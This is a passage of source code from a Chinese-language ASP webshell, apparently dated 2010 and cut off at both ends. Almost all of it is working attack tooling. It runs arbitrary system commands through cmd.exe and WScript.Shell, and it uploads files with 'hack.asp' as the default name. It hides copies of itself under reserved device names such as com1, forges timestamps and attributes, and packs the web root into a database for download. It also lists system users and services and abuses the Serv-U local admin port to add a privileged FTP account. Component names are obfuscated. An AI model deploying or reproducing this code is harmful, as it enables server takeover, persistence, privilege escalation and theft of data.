    strFlName=OneFile.Name
    If strFlName<>"desktop.ini" EQV strFlName<>"folder.htt" Then
      FN=Folder&"\"&strFlName
   Counter=Counter+ColorOn(FN)
 End If
  Next
  Set objFd=Nothing
  Set objFs=Nothing
  Set objFf=Nothing
 End Function
 Private Function CreatePattern(keyword)   
   CreatePattern=keyword
   CreatePattern=Replace(CreatePattern,".","\.")
   CreatePattern=Replace(CreatePattern,"+","\+")
   CreatePattern=Replace(CreatePattern,"(","\(")
   CreatePattern=Replace(CreatePattern,")","\)")
   CreatePattern=Replace(CreatePattern,"[","\[")
   CreatePattern=Replace(CreatePattern,"]","\]")
   CreatePattern=Replace(CreatePattern,"{","\{")
   CreatePattern=Replace(CreatePattern,"}","\}")
   CreatePattern=Replace(CreatePattern,"*","[^\\\/]*")
   CreatePattern=Replace(CreatePattern,"?","[^\\\/]{1}")
   CreatePattern="("&CreatePattern&")+"
 End Function
 Private Function ColorOn(FileName)
   dim objReg
   Set objReg=new RegExp
   objReg.Pattern=CreatePattern(keyword)
   objReg.IgnoreCase=True
   objReg.Global=True
   retVal=objReg.Test(Mid(FileName,InstrRev(FileName,"\")+1))
   if retVal then
     OutPut=objReg.Replace(Mid(FileName,InstrRev(FileName,"\")+1),"<font color='#FF0000'>$1</font>")
     OutPut="<table align='center' width='600'>&nbsp;" & Mid(FileName,1,InstrRev(FileName,"\")) & OutPut
  Response.Write OutPut
  Response.flush
  ColorOn=1
   else
     ColorOn=0
   end if
   Set objReg=Nothing
 End Function
End Class
function php():On Error Resume Next:set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.CreateTextFile(server.mappath("test.php")).Write"<?PHP echo 'oo∩_∩oo'?><?php phpinfo()?>":fso.CreateTextFile(server.mappath("test.jsp")).Write"Jsp Test oo∩_∩oo":fso.CreateTextFile(server.mappath("test.aspx")).Write"oo∩_∩oo":o(hph):End function:function apjdel():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.DeleteFile(server.mappath("test.aspx")):fso.DeleteFile(server.mappath("test.php")):fso.DeleteFile(server.mappath("test.jsp")):o"Del Success!":End function

Sub PageAddToMdb()
Dim theAct, thePath
theAct=Request("theAct")
thePath=Request("thePath")
Server.ScriptTimeOut=100000
If theAct="addToMdb" Then
addToMdb(thePath)
o "<div align=center><br>操作完成!</div>"&BackUrl
End If
If theAct="releaseFromMdb" Then
unPack(thePath)
o "<div align=center><br>操作完成!</div>"&BackUrl
Response.write ""
Response.end
End If
o(asds)
End Sub
Sub addToMdb(thePath)
On Error Resume Next
Dim rs, conn, stream, connStr, adoCatalog
Set rs=Server.CreateObject("ADODB.RecordSet")
Set stream=Server.CreateObject(Sot(6,0))
Set conn=Server.CreateObject(Sot(5,0))
Set adoCatalog=Server.CreateObject(Sot(2,0))
connStr="Provider=Microsoft.Jet.OLEDB.4.0; Data Source="&Server.MapPath("HSH.mdb")
adoCatalog.Create connStr
conn.Open connStr
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
stream.Open
stream.Type=1
rs.Open "FileData", conn, 3, 3
If Request("theMethod")="fso" Then
fsoTreeForMdb thePath, rs, stream
 Else
saTreeForMdb thePath, rs, stream
End If
rs.Close
Conn.Close
stream.Close
Set rs=Nothing
Set conn=Nothing
Set stream=Nothing
Set adoCatalog=Nothing
End Sub

sub SetFileText()
response.write "<form method=post>"
response.write "路&nbsp;&nbsp;&nbsp;&nbsp;径：<input name=path1 value='"&server.mappath("/")&"\"&"' size='30'>(一定要以\结尾)<br />"
response.write "文件名称：<input name=filename value='index.asp' size='30'><br />"
response.write "修改时间：<input name=time value='12/30/2099 12:30:30' size='30'><br />"
response.write "属性:<select onChange='this.form.shuxing.value=this.value;'><option value=''>普通 </option><option value='1'>只读 </option><option value='2'>隐藏 </option><option value='4'>系统</option><option value='33'>只读,存档 </option><option value='34'>隐藏,存档 </option><option value='35'>只读隐藏,存档 </option><option value='39'>只读隐藏,存档,系统 </option><input name=shuxing value='0' size='10'><br />"
response.write "<input type=submit value=修改并隐藏文件>"
response.write "</form>"
set path=request.Form("path1")
set fileName=request.Form("filename")
set newTime=request.Form("time")
set ShuXing=request.Form("shuxing")
if( (len(path)>0)and(len(fileName)>0)and(len(newTime)>0) )then
Set fso=Server.CreateObject("Scripting.FileSystemObject")
Set file=fso.getFile(path&fileName)
file.attributes=shuxing
Set shell=Server.CreateObject("Shell.Application")
Set app_path=shell.NameSpace(server.mappath("."))
Set app_file=app_path.ParseName(fileName)
app_file.Modifydate=newTime
o "</br></br>修改文件&nbsp;&nbsp;"&path&fileName&"&nbsp;&nbsp;属性完成 </center>"
end if
end sub

sub hiddenshell
o "<form name=form1 method=post><input type=hidden name=se1 value=hidden1>不死僵尸生成将会生成一个新的文件，重新记录地址<input type=submit name=submit value='不死僵尸超级隐藏'></form>"
if request("se1")="hidden1" then
fpath=request.servervariables("path_translated")
set fso=server.createobject("scripting.filesystemobject")
pex="com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9"
rndpex=split(pex,"|")(rndnumber(0,17))
session("seljw")=""
filepath1=server.mappath(".")
filename1=right(fpath,len(fpath)-instrrev(fpath,"\"))
url=request.servervariables("url")
url=left(url,instrrev(url,"/"))&rndpex&"."&filename1
fso.copyfile fpath,"\\.\"&filepath1&"\"&rndpex&"."&filename1
set fso=nothing
o "<script>parent.location='http://"&request("server_name")&url&"';</script>"
end if
end sub
Function RndNumber(Min,Max) 
Randomize 
RndNumber=Int((Max - Min + 1) * Rnd() + Min) 
End Function



Function fsoTreeForMdb(thePath, rs, stream)
Dim item, theFolder, folders, files, sysFileList
sysFileList="$HSH.mdb$HSH.ldb$"
If Server.CreateObject(Sot(0,0)).FolderExists(thePath)=False Then
showErr(thePath&" 目录不存在或者不允许访问!")
End If
Set theFolder=Server.CreateObject(Sot(0,0)).GetFolder(thePath)
Set files=theFolder.Files
Set folders=theFolder.SubFolders
For Each item In folders
fsoTreeForMdb item.Path, rs, stream
Next
For Each item In files
If InStr(sysFileList, "$"&item.Name&"$") <= 0 and lcase(item.path)<>lcase(Request.ServerVariables("PATH_TRANSLATED")) Then
rs.AddNew
rs("thePath")=Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent")=stream.Read()
rs.Update
End If
Next
Set files=Nothing
Set folders=Nothing
Set theFolder=Nothing
End Function
Sub unPack(thePath)
On Error Resume Next
Server.ScriptTimeOut=100000
Dim rs, ws, str, conn, stream, connStr, theFolder
str=Server.MapPath(".")&"\"
Set rs=CreateObject("ADODB.RecordSet")
Set stream=CreateObject(Sot(6,0))
Set conn=CreateObject(Sot(5,0))
connStr="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&thePath&";"
conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type=1
Do Until rs.Eof
theFolder=Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If Server.CreateObject(Sot(0,0)).FolderExists(str&theFolder)=False Then
createFolder(str&theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str&rs("thePath"), 2
rs.MoveNext
Loop
rs.Close
conn.Close
stream.Close
Set ws=Nothing
Set rs=Nothing
Set stream=Nothing
Set conn=Nothing
End Sub
Sub createFolder(thePath)
Dim i
i=Instr(thePath, "\")
Do While i > 0
If Server.CreateObject(Sot(0,0)).FolderExists(Left(thePath, i))=False Then
Server.CreateObject(Sot(0,0)).CreateFolder(Left(thePath, i - 1))
End If
If InStr(Mid(thePath, i + 1), "\") Then
i=i + Instr(Mid(thePath, i + 1), "\")
Else
i=0
End If
Loop
End Sub
Sub saTreeForMdb(thePath, rs, stream)
Dim item, theFolder, sysFileList
sysFileList="$HSH.mdb$HSH.ldb$"
Set theFolder=saX.NameSpace(thePath)
For Each item In theFolder.Items
If item.IsFolder=True Then
saTreeForMdb item.Path, rs, stream
Else
If InStr(sysFileList, "$"&item.Name&"$") <= 0 and lcase(item.path)<>lcase(Request.ServerVariables("PATH_TRANSLATED")) Then
rs.AddNew
rs("thePath")=Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent")=stream.Read()
rs.Update
End If
End If
Next
Set theFolder=Nothing
End Sub

u=request.servervariables("http_host")&url
Function Course()
SI="<br><table width='80%' align='center'>"
SI=SI&"<tr><td height='20' colspan='3' align='center' id=s><b>系统用户与服务</b></td></tr>"
on error resume next
for each obj in getObject("WinNT://.")
err.clear
if OBJ.StartType="" then
SI=SI&"<tr><td height=""20"" id=d>&nbsp;"
SI=SI&obj.Name
SI=SI&"</td><td id=d>&nbsp;系统用户(组)</td></tr>"
SI0="<tr><td height=""20"" id=d colspan=""2"">&nbsp;</td></tr>" 
end if
if OBJ.StartType=2 then lx="自动"
if OBJ.StartType=3 then lx="手动"
if OBJ.StartType=4 then lx="禁用"
if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
SI1=SI1&"<tr><td height=""20"" id=d>&nbsp;"&obj.Name&"</td><td height=""20"" id=d>&nbsp;"&obj.DisplayName&"<tr><td height=""20"" id=d colspan=""2"">[启动类型:"&lx&"]<font>&nbsp;"&obj.path&"</font></td></tr>"
else
SI2=SI2&"<tr><td height=""20"" id=d>&nbsp;"&obj.Name&"</td><td height=""20"" id=d>&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[启动类型:"&lx&"]<font color=#3399FF>&nbsp;"&obj.path&"</font></td></tr>"
end if
next
o SI&SI0&SI1&SI2&"</table>"
End Function
Function IIf(var, val1, val2)
If var=True Then
IIf=val1
Else
IIf=val2
End If
End Function
Function GetTheSizes(num)
Dim i, arySize(4)
arySize(0)="B"
arySize(1)="KB"
arySize(2)="MB"
arySize(3)="GB"
arySize(4)="TB"
While(num / 1024 >= 1)
num=Fix(num / 1024 * 100) / 100
i=i + 1
WEnd
GetTheSizes=num&" "&arySize(i)
End Function
Function HtmlEncodes(str)
If IsNull(str) Then Exit Function
HtmlEncodes=Server.HTMLEncode(str)
End Function
Sub ShowErr1(str)
Dim i, arrayStr
str=Server.HtmlEncode(str)
arrayStr=Split(str, "$$")
o "<font size=2 color=red><br/><a href='javascript:history.back()'>出错信息:<br/><br/>"
For i=0 To UBound(arrayStr)
o "&nbsp;&nbsp;"&(i + 1)&". "&arrayStr(i)&"(点此返回上页)<br/>"
Next
o "</a></font>"
Response.End()
End Sub
Function GetPost(var)
Dim val
If Request.QueryString("Action")="PageUpfile" Then
Action="PageUpfile"
Exit Function
End If
val=RTrim(Request.Form(var))
If val="" Then
val=RTrim(Request.QueryString(var))
End If
GetPost=val
End Function
Sub ChkErr(Err)
If Err Then
o "<hr/><font size=2><a href='javascript:history.back()'><li>错误: "&Err.Description&"</li><li>错误源: "&Err.Source&"(点此返回上页)</li></a><br/>"
Err.Clear
Response.End
End If
End Sub
Sub PageCheck()
InfoCheck()
If request("theAct") <> "" Then
GetAppOrSession(theAct)
End If
ObjCheck()
End Sub
Sub InfoCheck()
Dim aryCheck(6)
On Error Resume Next
aryCheck(0)=Server.ScriptTimeOut()&"(秒)"
aryCheck(1)=FormatDateTime(Now(), 0)
aryCheck(2)=Request.ServerVariables("SERVER_NAME")
aryCheck(2)=aryCheck(2)&", "&Request.ServerVariables("LOCAL_ADDR")
aryCheck(2)=aryCheck(2)&":"&Request.ServerVariables("SERVER_PORT")
aryCheck(3)=Request.ServerVariables("OS")
aryCheck(3)=IIf(aryCheck(3)="", "Windows2003", aryCheck(3))&", "&Request.ServerVariables("SERVER_SOFTWARE")
aryCheck(3)=aryCheck(3)&", "&ScriptEngine&"/"&ScriptEngineMajorVersion&"."&ScriptEngineMinorVersion&"."&ScriptEngineBuildVersion
aryCheck(4)=rootPath&", "&GetTheSizes(fso.GetFolder(rootPath).Size)
aryCheck(5)="Path: "&Request.ServerVariables("PATH_TRANSLATED")&", "
aryCheck(5)=aryCheck(5)&"Url: "&net&""&Request.ServerVariables("SERVER_NAME")&Request.ServerVariables("Url")
aryCheck(6)="变量数: "&Application.Contents.Count()&"(<a href="&Url&"?Action=PageCheck&theAct=app>Application</a>),"
aryCheck(6)=aryCheck(6)&" 会话数: "&Session.Contents.Count&"(<a href="&Url&"?Action=PageCheck&theAct=session>Session</a>),"
aryCheck(6)=aryCheck(6)&" 当前会话ID: "&Session.SessionId()
aryCheck(6)=aryCheck(6)&" ServerVariables: "&Request.ServerVariables.Count&"(<a href="&Url&"?Action=PageCheck&theAct=serverv>ServerVariables</a>),"
aryCheck(6)=aryCheck(6)&" Cookies: "&Request.Cookies.Count&"(<a href="&Url&"?Action=PageCheck&theAct=cook>Cookies</a>)"
o "<br><table width=90% align=center><tr><td colspan=2 id=s align=center><font face=webdings>8</font> <b>服务器基本信息</b></td></tr><tr><td width='15%' id=s><b>Options</font></b></td><td id=s><b>Values</b></td></tr></tr><tr><td height='20' width='200' id=d>服务器名端口</td><td id=d>"&aryCheck(2)&"</td></tr>"
o"<form method=post action='http://www.ip138.com/ips8.asp?ip="&Request.ServerVariables("LOCAL_ADDR")&"&action=2' name='ipform' target='_blank'><tr><td height='20' width='200' id=d>服务器IP地址</td><td id=d><input type='text' name='ip' size='15' value='"&Request.ServerVariables("LOCAL_ADDR")&"'> <input class=sb type='submit' value='Inquiry IP'><input type='hidden' name='action' value='2'>"
o"</td></tr></form><tr><td height='20' width='200' id=d>服务器操作系统</td><td id=d>"&Request.ServerVariables("OS")&"</td></tr><tr><td height='20' width='200' id=d>WEB服务器版本</td><td id=d>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr><tr><td id=d>主机默认超时</td><td id=d>"&aryCheck(0)&"</td></tr><tr><td id=d>主机当前时间</td><td id=d>"&aryCheck(1)&"</td></tr><tr><td id=d>主机软件环境</td><td id=d>"&aryCheck(3)&"</td></tr><tr><td id=d>当前据对路径</td><td id=d>"&Server.MapPath("/")&"</td></tr><tr><td id=d>当前文件路径</td><td id=d>"&aryCheck(5)&"</td></tr><tr><td id=d>其它相关信息</td><td id=d>"&aryCheck(6)&"</td></tr></table>"
End Sub
function conts(url) 
on error resume next 
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.send() 
if Http.readystate<>4 then
conts=""
exit function 
end if 
conts=bytes2BSTR(Http.responseBody) 
set http=nothing
if err.number<>0 then err.Clear  
end function 
Sub ObjCheck()
Dim aryObj(25)
Dim x, objTmp, theObj, strObj
On Error Resume Next
strObj=Trim(getPost("TheObj"))
aryObj(0)="MSWC.AdRotator|广告轮换组件"
aryObj(1)="MSWC.BrowserType|浏览器信息组件"
aryObj(2)="MSWC.NextLink|内容链接库组件"
aryObj(3)="MSWC.Tools|"
aryObj(4)="MSWC.Status|"
aryObj(5)="MSWC.Counters|计数器组件"
aryObj(6)="MSWC.PermissionChecker|权限检测组件"
aryObj(7)="Adodb.Connection|ADO 数据对象组件"
aryObj(8)="CDONTS.NewMail|虚拟 SMTP 发信组件"
aryObj(9)="Sc"&DEfd&"rip"&DEfd&"ting"&DEfd&".F"&DEfd&"ileS"&DEfd&"yste"&DEfd&"mObj"&DEfd&"ect|FSO组件"
aryObj(10)="Ado"&DEfd&"d"&DEfd&"b"&DEfd&".S"&DEfd&"tre"&DEfd&"am|Stream 流组件"
aryObj(11)="S"&DEfd&"he"&DEfd&"ll"&DEfd&"."&DEfd&"A"&DEfd&"ppli"&DEfd&"ca"&DEfd&"tion|"
aryObj(12)="W"&DEfd&"sc"&DEfd&"ri"&DEfd&"pt.S"&DEfd&"he"&DEfd&"ll|"
aryObj(13)="Wscript.Network|"
aryObj(14)="ADOX.Catalog|"
aryObj(15)="JMail.SmtpMail|JMail 邮件收发组件"
aryObj(16)="Persits.Upload.1|ASPUpload 文件上传组件"
aryObj(17)="LyfUpload.UploadFile|刘云峰的文件上传组件组件"
aryObj(18)="SoftArtisans.FileUp|SA-FileUp 文件上传组件"
aryObj(19)="Microsoft.XMLHTTP|数据传输组件"
aryObj(20)="ADOX.Catalog|ACCESS建库组件"
aryObj(21)="JRO.JetEngine|ACCESS压缩组件"
aryObj(22)="Scripting.Dictionary|数据流上传辅助组件"
aryObj(23)="Adodb.connection|数据库连接组件"
aryObj(24)="SmtpMail.SmtpMail.1|SmtpMail发信组件"
aryObj(25)=strObj&"|Checkd Options By Yourself"
o "<br/><table width=90% align=center><tr><td colspan=4 id=s align=center><font face=webdings>8</font><B>服务器组件信息</B></td></tr><tr><td id=s><b>Options</b></td><td id=s><b>Description</b></td><td id=s align=center><b>Values</b></td><td id=s><b>Version</b></td></tr>"
For Each x In aryObj
theObj=Split(x, "|")
If theObj(0)="" Then Exit For
Set objTmp=Server.CreateObject(theObj(0))
If Err <> -2147221005 Then
x=x&"|√|"
x=x&objTmp.Version
Else
x=x&"|<font color=red>×</font>|"
End If
If Err Then Err.Clear
Set objTmp=Nothing
theObj=Split(x, "|")
if theObj(1)="" then Descriptions="This's No Description" else Descriptions=theObj(1) end if
if theObj(3)="" then Versions="Can't Get The Option's Version" else	Versions=theObj(3) end if
o "<tr><td id=d>"&theObj(0)&"</td><td id=d>"&Descriptions&"</td><td align=center id=d>"&theObj(2)&"</td><td align=center id=d>"&Versions&"</td></tr>"
Next
o "<form method=post action='"&url&"?Action=PageCheck'><input type=hidden name=PageName value=PageCheck><input type=hidden name=theAct id=theAct><tr><td colspan=4 id=d height=25><b id=x>Check The Other Options:&nbsp;</b><input name=TheObj type=text id=TheObj style='width:570px;' value="""&strObj&""">&nbsp;<input class=sb type=submit name=Submit value=""Just Go""></td></tr></form></table>"
End Sub
function cnost(url) 
on error resume next 
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.send() 
if Http.readystate<>4 then
getHTTPPage=""
exit function 
end if 
getHTTPPage=bytes2BSTR(Http.responseBody) 
set http=nothing
if err.number<>0 then err.Clear  
end function 
x="f>f'#0@v>#'v'#'q>#'vtfsqbtt'##"'
Sub GetAppOrSession(theAct)
Dim x, y
On Error Resume Next
o "<br/><table width=80% border=1 align=center class=fixTable><tr><td colspan=2 class=td><font face=webdings>8</font> Application/Session 查看</td></tr><tr><td colspan=2 class=trHead>&nbsp;</td></tr><tr class=td><td width='20%'>&nbsp;变量</td><td>&nbsp;值</td></tr>"
If request("theAct")="app" Then
For Each x In Application.Contents
o "<tr><td valign=top>&nbsp;<span class=fixSpan style='width:130px;' title='"&x&"'>"&x&"<span></td><td style='padding-left:7px;'><span>"
If IsArray(Application(x))=True Then
For Each y In Application(x)
o "<div>"&Replace(HtmlEncodes(y), vbNewLine, "<br/>")&"</div>"
Next
Else
o Replace(HtmlEncodes(Application(x)), vbNewLine, "<br/>")
End If
o "</span></td></tr>"
Next
End If
If request("theAct")="session" Then
For Each x In Session.Contents
o "<tr><td valign=top>&nbsp;<span class=fixSpan style='width:130px;' title='"&x&"'>"&x&"<span></td><td style='padding-left:7px;'><span>"
o Replace(HtmlEncodes(Session(x)), vbNewLine, "<br/>")
o "</span></td></tr>"
Next
End If
If request("theAct")="serverv" Then
For Each x In Request.ServerVariables
o "<tr><td valign=top>&nbsp;<span class=fixSpan style='width:130px;' title='"&x&"'>"&x&"<span></td><td style='padding-left:7px;'><span>"
o Replace(HtmlEncodes(Request.ServerVariables(x)), vbNewLine, "<br/>")
o "</span></td></tr>"
Next
End If
If request("theAct")="cook" Then
For Each x In Request.Cookies
o "<tr><td valign=top>&nbsp;<span class=fixSpan style='width:130px;' title='"&x&"'>"&x&"<span></td><td style='padding-left:7px;'><span>"
o Replace(HtmlEncodes(Request.Cookies(x)), vbNewLine, "<br/>")
o "</span></td></tr>"
Next
End If
o "<tr><td colspan=2 class=trHead>&nbsp;</td></tr><tr align=right><td colspan=2 class=td>By 玩命 2010.04&nbsp;</td></tr></table>"
End Sub

Function suftp()
o"<p><center>Serv-U T权程序--增强版</p>"
o"<form name='form1' method='post' action=''>"
o"<center>管理员:<input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'><br>"
o"<center>管理员密码 :<input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'><br>"
o"<center>SERV-U端口:<input name='dport' type='text' class='TextBox' id='dport' value='43958'><br>"
o"<center>添加的用户名:<input name='tuser' type='text' class='TextBox' id='tuser' value='1'><br>"
o"<center>添加的用户密码:<input name='tpass' type='text' class='TextBox' id='pass' value='1'><br>"
o"<center>帐号的所对的路径:<input name='tpath' type='text' class='TextBox' id='tpath' value='C:\'><br>"
o"<center>服务端口:<input name='tport' type='text' class='TextBox' id='tport' value='21'><br>"
o"<center><input name='radiobutton' type='radio' value='add' checked class='TextBox'>确定添加"
o"<center><input type='radio' name='radiobutton' value='del' class='TextBox'>确定删除"
o"<p><input name='Submit' type='submit' class='buttom' value='提交'></p></form>"
Usr = request.Form("duser")
pwd = request.Form("dpwd")
port = request.Form("dport")
tuser = request.Form("tuser")
tpass = request.Form("tpass")
tpath = request.Form("tpath")
tport = request.Form("tport")
'Command = request.Form("dcmd")
if request.Form("radiobutton") = "add" Then
leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
'leaves = leaves & "-SETDOMAIN" & vbcrlf & "-Domain=cctv|0.0.0.0|43859|-1|1|0" & vbcrlf & "-TZOEnable=0" & vbcrlf & " TZOKey=" & vbcrlf
leaves = leaves & "-SETUSERSETUP" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & "-User=" & tuser & vbcrlf & "-Password=" & tpass & vbcrlf & _
"-HomeDir=" & tpath & "\" & vbcrlf & "-LoginMesFile=" & vbcrlf & "-Disable=0" & vbcrlf & "-RelPaths=1" & vbcrlf & _
"-NeedSecure=0" & vbcrlf & "-HideHidden=0" & vbcrlf & "-AlwaysAllowLogin=0" & vbcrlf & "-ChangePassword=0" & vbcrlf & _
"-QuotaEnable=0" & vbcrlf & "-MaxUsersLoginPerIP=-1" & vbcrlf & "-SpeedLimitUp=0" & vbcrlf & "-SpeedLimitDown=0" & vbcrlf & _
"-MaxNrUsers=-1" & vbcrlf & "-IdleTimeOut=600" & vbcrlf & "-SessionTimeOut=-1" & vbcrlf & "-Expire=0" & vbcrlf & "-RatioUp=1" & vbcrlf & _
"-RatioDown=1" & vbcrlf & "-RatiosCredit=0" & vbcrlf & "-QuotaCurrent=0" & vbcrlf & "-QuotaMaximum=0" & vbcrlf & _
"-Maintenance=System" & vbcrlf & "-PasswordType=Regular" & vbcrlf & "-Ratios=None" & vbcrlf & " Access=" & tpath & "\|RWAMELCDP" & vbcrlf
'leaves = leaves & "quit" & vbcrlf
On Error Resume Next
Set xPost = CreateObject("MSXML2.XMLHTTP")
xPost.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost.Send(leaves)
Set xPOST=nothing
response.write ("命令成功执行！！FTP 用户名: " & tuser & " " & "密码: " & tpass & " 路径: " & tpath & " :)<br><BR>")
else
leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & " User=" & tuser & vbcrlf
Set xPost3 = CreateObject("MSXML2.XMLHTTP")
xPost3.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost3.Send(leaves)
Set xPOST3=nothing
end if
End Function

Function DownFile(Path)
Response.Clear
Set OSM=CreateObject(Sot(6,0))
OSM.Open
OSM.Type=1
OSM.LoadFromFile Path
sz=InstrRev(path,"\")+1
Response.AddHeader "Content-Disposition", "attachment; filename="&Mid(path,sz)
Response.AddHeader "Content-Length", OSM.Size
Response.Charset="UTF-8"
Response.ContentType="application/octet-stream"
Response.BinaryWrite OSM.Read
Response.Flush
OSM.Close
Set OSM=Nothing
End Function
Function HTMLEncode(S)
if not isnull(S) then
S=replace(S, ">", "&gt;")
S=replace(S, "<", "&lt;")
S=replace(S, CHR(39), "&#39;")
S=replace(S, CHR(34), "&quot;")
S=replace(S, CHR(20), "&nbsp;")
HTMLEncode=S
end if
End Function
Function upfile()
If Request("Action2")="Post" Then
Set U=new UPC : Set F=U.UA("LocalFile")
UName=U.form("ToPath")
If UName="" Or F.FileSize=0 then
SI="<br>请输入上传的完全路径后选择一个文件上传!"
Else
F.SaveAs UName
If Err.number=0 Then
SI="<center><br>恭喜文件"&UName&"上传成功！</center>"
End if
End If
Set F=nothing:Set U=nothing
SI=SI&BackUrl
o SI
ShowErr()
Response.End
End If
o "<br><table border='0' align='center'><form name='UpForm' method='post' action='"&URL&"?Action=upfile&Action2=Post' enctype='multipart/form-data'><tr><td id=s colspan=4 align=center><b id=x>Single Upload File</b></td></tr><tr><td id=d><b id=x>Save File：</b></td><td id=d><input name='ToPath' value='"&RRePath(Session("FolderPath")&"\hack.asp")&"' size='40'></td><Td id=d><b id=x>Browse File：</b></td><td id=d><input type='file' name='LocalFile' />&nbsp;<input type='submit' name='Submit' value='Upload File'></td></tr><tr><td id=d colspan=4 align=center>&nbsp;</td></tr></form></table>"
End Function
Function Cmd1Shell()
checked="checked"
If Request("SP")<>"" Then Session("ShellPath")=Request("SP")
ShellPath=Session("ShellPath")
if ShellPath="" Then ShellPath="cmd.exe"
if Request("wscript")<>"yes" then checked=""
If Request("cmd")<>"" Then DefCmd=Request("cmd")
SI="<form method='post'><table width=100% border=0><tr><td id=s align=center><b id=x>System Command</b></td></tr><tr><td id=d><b id=x>Shell Path：</b><input name='SP' value='"&ShellPath&"' Style='width:70%'>&nbsp;&nbsp;<input class=c type='checkbox' name='wscript' value='yes'"&checked&" id=d>WScript.Shell</td></tr><tr><Td id=d><b id=x>Command:&nbsp;&nbsp;</b><input name='cmd' Style='width:70%' value='"&DefCmd&"'> <input type='submit' value='Execute'></td></tr><tr><td id=d><textarea Style='width:100%;height:440;'>"
If Request.Form("cmd")<>"" Then
if Request.Form("wscript")="yes" then
Set CM=CreateObject(Sot(1,0))
Set DD=CM.exec(ShellPath&" /c "&DefCmd)
aaa=DD.stdout.readall
SI=SI&aaa
else
On Error Resume Next
Set ws=Server.CreateObject(Sot(1,0))
If IsEmpty(ws) Then
set ws=ws
End if
Set fso=Server.CreateObject(Sot(0,0))
If IsEmpty(fso) Then
set fso=fso
End if
szTempFile=server.mappath("cmd.txt")
Call ws.Run (ShellPath&" /c "&DefCmd&" > "&szTempFile, 0, True)
Set fs=CreateObject(Sot(0,0))
Set oFilelcx=fs.OpenTextFile (szTempFile, 1, False, 0)
aaa=Server.HTMLEncode(oFilelcx.ReadAll)
oFilelcx.Close
Call fso.DeleteFile(szTempFile, True)
SI=SI&aaa
end if
End If
SI=SI&chr(13)&"</textarea></td></tr></table></form>"
o SI
End Function

Function CreateMdb(Path) 
SI="<br><br>"
Set C=CreateObject(Sot(2,0)) 
C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path)
Set C=Nothing
If Err.number=0 Then
SI=SI&Path&"新建成功!"
End If
SI=SI&BackUrl 
o SI
End function
Function CompactMdb(Path)
If Sot(0,1)=" ×" Then
Set C=CreateObject(Sot(3,0)) 
C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path," Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path
Set C=Nothing
Else
Set FSO=CreateObject(Sot(0,0))
If FSO.FileExists(Path) Then
Set C=CreateObject(Sot(3,0)) 
C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path," Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&"_bak"
Set C=Nothing
FSO.DeleteFile Path
FSO.MoveFile Path&"_bak",Path
Else
SI="<center><br><br><br>数据库"&Path&"没有发现！</center>" 
Err.number=1
End If
Set FSO=Nothing
End If
If Err.number=0 Then
SI="<center><br><br><br>数据库"&Path&"压缩成功！</center>"
End If
SI=SI&BackUrl
o SI
End Function
Dim SearchGroup(127)
function Cosnt(fasle)
 dim w
 w="^w^inhttp.^wi^nhttprequest.5.1"
 fasle=replace(trim(fasle),vbcrlf,"")
 on error resume next
 set http= CreateObject(replace(w,"^",""))
 http.open "POST",fasle,false
 http.SetRequestHeader "REFERER", ""&net&""&request.ServerVariables("HTTP_HOST")&request.ServerVariables("URL")
 http.send
 Set http=Nothing
end function

Dim T1
Class UPC
Dim D1,D2
Public Function Form(F)
F=lcase(F)
If D1.exists(F) then:Form=D1(F):else:Form="":end if
End Function
Public Function UA(F)
F=lcase(F)
If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
End Function
Private Sub Class_Initialize
Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
set D1=CreateObject(Sot(4,0))
if Request.TotalBytes<1 then Exit Sub
set T1=CreateObject(Sot(6,0))
T1.Type=1 : T1.Mode =3 : T1.Open
T1.Write Request.BinaryRead(Request.TotalBytes)
T1.Position=0 : TDa =T1.Read : DStart=1
DEnd=LenB(TDa)
set D2=CreateObject(Sot(4,0))
vbCrlf=chrB(13)&chrB(10)
set T2=CreateObject(Sot(6,0))
TSt=MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
TLen=LenB (TSt)
DStart=DStart+TLen+1
while (DStart + 10) < DEnd
DIEnd=InStrB(DStart,TDa,vbCrlf&vbCrlf)+3
T2.Type=1 : T2.Mode =3 : T2.Open
T1.Position=DStart
T1.CopyTo T2,DIEnd-DStart
T2.Position=0 : T2.Type=2 : T2.Charset ="gb2312"
